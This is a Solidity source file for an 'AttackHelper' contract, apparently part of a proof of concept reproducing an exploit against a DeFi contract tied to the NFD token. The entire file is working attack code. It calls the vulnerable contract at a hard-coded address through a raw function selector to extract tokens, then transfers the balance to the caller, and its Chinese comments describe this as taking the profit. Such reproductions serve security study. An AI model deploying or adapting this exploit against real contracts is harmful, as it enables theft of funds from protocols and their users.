pragma solidity ^0.8.10;

import "../interface.sol";

contract AttackHelper {
    address constant toAttack = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;

    function attack() external {
        // 调用漏洞合约的方法获利
        toAttack.call(abi.encode(bytes4(0x6811e3b9)));

        // 将本金和获利一同发送到攻击合约
        uint256 bal = IERC20(nfd).balanceOf(address(this));

        IERC20(nfd).transfer(msg.sender, bal);
    }
}